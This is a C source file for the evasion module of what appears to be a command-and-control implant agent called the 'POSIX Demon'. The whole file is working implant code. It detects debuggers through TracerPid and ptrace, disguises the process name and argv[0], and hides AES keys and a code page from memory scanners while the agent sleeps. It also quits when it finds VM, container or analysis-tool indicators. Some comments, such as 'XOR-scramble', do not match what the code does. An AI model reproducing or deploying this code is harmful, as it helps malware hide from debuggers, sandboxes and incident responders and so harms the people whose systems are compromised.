/*
 * Evasion.c — Anti-analysis / evasion techniques for the POSIX Demon.
 *
 * Techniques implemented:
 *   1. Anti-debug: detect TracerPID / ptrace self-attach
 *   2. Process name masquerading (prctl PR_SET_NAME on Linux,
 *                                 pthread_setname_np on macOS)
 *   3. Memory scrubbing: zero-out sensitive buffers after use
 *   4. Obfuscated sleep: XOR-scramble agent memory during sleep
 *      (mprotect-based — make image non-readable while sleeping)
 *   5. Environment checks: bail out if running in known sandbox/VM
 */

#include "DemonPosix.h"
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>

#ifdef __APPLE__
#  include <pthread.h>
#  include <sys/types.h>
#else
#  include <sys/prctl.h>
#  include <sys/ptrace.h>
#  include <sys/mman.h>
#endif

/* ── 1. Anti-debug ───────────────────────────────────────────────────── */

#ifdef __APPLE__
#include <sys/sysctl.h>
bool EvasionIsBeingDebugged(void)
{
    int                mib[4];
    struct kinfo_proc  info;
    size_t             size = sizeof(info);

    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();

    memset(&info, 0, sizeof(info));
    sysctl(mib, 4, &info, &size, NULL, 0);

    return (info.kp_proc.p_flag & P_TRACED) != 0;
}
#else
bool EvasionIsBeingDebugged(void)
{
    /* Method 1: read /proc/self/status for TracerPid */
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int tracer = atoi(line + 10);
                fclose(f);
                return tracer != 0;
            }
        }
        fclose(f);
    }

    /* Method 2: ptrace self-attach — if we can attach to ourselves,
     *            no debugger is attached */
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) return true;
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
    return false;
}
#endif

/* ── 2. Process name masquerade ──────────────────────────────────────── */
void EvasionSetProcessName(const char *name)
{
#ifdef __APPLE__
    pthread_setname_np(name);
#else
    prctl(PR_SET_NAME, name, 0, 0, 0);
#endif
}

/* On Linux we can also overwrite argv[0] to change the ps/top display.
 * Call this from main() before RuntimeInit(). */
void EvasionMasqueradeArgv(char **argv, const char *fake_name)
{
    if (!argv || !argv[0] || !fake_name) return;
    size_t orig_len = strlen(argv[0]);
    size_t fake_len = strlen(fake_name);
    size_t copy_len = fake_len < orig_len ? fake_len : orig_len;
    memset(argv[0], 0, orig_len);
    memcpy(argv[0], fake_name, copy_len);
}

/* ── 3. Memory scrubbing ─────────────────────────────────────────────── */
/*
 * EvasionScrubMemory — write zeros over a sensitive buffer so it does
 * not linger in memory after use.
 * Using volatile to prevent the compiler from optimising it away.
 */
void EvasionScrubMemory(void *ptr, size_t len)
{
    volatile uint8_t *p = (volatile uint8_t *)ptr;
    while (len--) *p++ = 0;
}

/* ── 4. Obfuscated sleep (mprotect-based) ────────────────────────────── */
/*
 * While sleeping, mark the .text / heap regions containing sensitive data
 * as PROT_NONE so a memory scanner cannot read them, then restore before
 * waking up.
 *
 * This requires knowing the page boundaries.  We use a simple approach:
 * take the address of a known symbol and round down to page size.
 *
 * NOTE: On macOS with SIP, mprotect() on the text segment will fail.
 *       The fallback is a plain sleep.
 */
static long g_page_size = 0;

void ObfuscatedSleep(uint32_t seconds, uint32_t jitter_pct)
{
    if (g_page_size == 0) g_page_size = sysconf(_SC_PAGESIZE);

#ifndef __APPLE__
    /* Locate the page containing RuntimeLoop (our own .text) */
    uintptr_t fn_addr = (uintptr_t)RuntimeLoop;
    uintptr_t page    = fn_addr & ~(uintptr_t)(g_page_size - 1);

    /* XOR-scramble the AES keys while sleeping */
    uint8_t key_backup[AES_KEY_SIZE + AES_IV_SIZE];
    memcpy(key_backup, DemonInstance->Encryption.AesKey, AES_KEY_SIZE);
    memcpy(key_backup + AES_KEY_SIZE, DemonInstance->Encryption.AesIv, AES_IV_SIZE);
    EvasionScrubMemory(DemonInstance->Encryption.AesKey, AES_KEY_SIZE);
    EvasionScrubMemory(DemonInstance->Encryption.AesIv,  AES_IV_SIZE);

    /* Make one page non-readable */
    bool mprotect_ok = (mprotect((void *)page, (size_t)g_page_size, PROT_NONE) == 0);

    DoSleep(seconds, jitter_pct);

    /* Restore */
    if (mprotect_ok) {
        mprotect((void *)page, (size_t)g_page_size,
                 PROT_READ | PROT_WRITE | PROT_EXEC);
    }
    memcpy(DemonInstance->Encryption.AesKey, key_backup, AES_KEY_SIZE);
    memcpy(DemonInstance->Encryption.AesIv,  key_backup + AES_KEY_SIZE, AES_IV_SIZE);
    EvasionScrubMemory(key_backup, sizeof(key_backup));
#else
    /* macOS fallback */
    DoSleep(seconds, jitter_pct);
#endif
}

/* ── 5. Sandbox / VM detection ───────────────────────────────────────── */
bool EvasionIsSandboxed(void)
{
#ifdef __APPLE__
    /* Check for common macOS analysis tool files */
    const char *indicators[] = {
        "/Applications/Wireshark.app",
        "/Library/Little Snitch",
        "/usr/local/bin/lldb",
        NULL
    };
#else
    /* Check for common Linux VM / sandbox indicators */
    const char *indicators[] = {
        "/.dockerenv",
        "/proc/vz",
        "/proc/xen",
        NULL
    };
#endif

    for (int i = 0; indicators[i]; i++) {
        if (access(indicators[i], F_OK) == 0) return true;
    }

#ifndef __APPLE__
    /* Check /proc/cpuinfo for hypervisor flag */
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "hypervisor")) { fclose(f); return true; }
        }
        fclose(f);
    }

    /* Check DMI for known VM vendors */
    const char *dmi_files[] = {
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/product_name",
        NULL
    };
    const char *vm_strings[] = { "VMware", "VirtualBox", "QEMU", "KVM",
                                  "Xen", "Bochs", "Parallels", NULL };
    for (int i = 0; dmi_files[i]; i++) {
        f = fopen(dmi_files[i], "r");
        if (!f) continue;
        char buf[256] = "";
        if (fgets(buf, sizeof(buf), f)) {
            for (int j = 0; vm_strings[j]; j++) {
                if (strstr(buf, vm_strings[j])) { fclose(f); return true; }
            }
        }
        fclose(f);
    }
#endif

    return false;
}
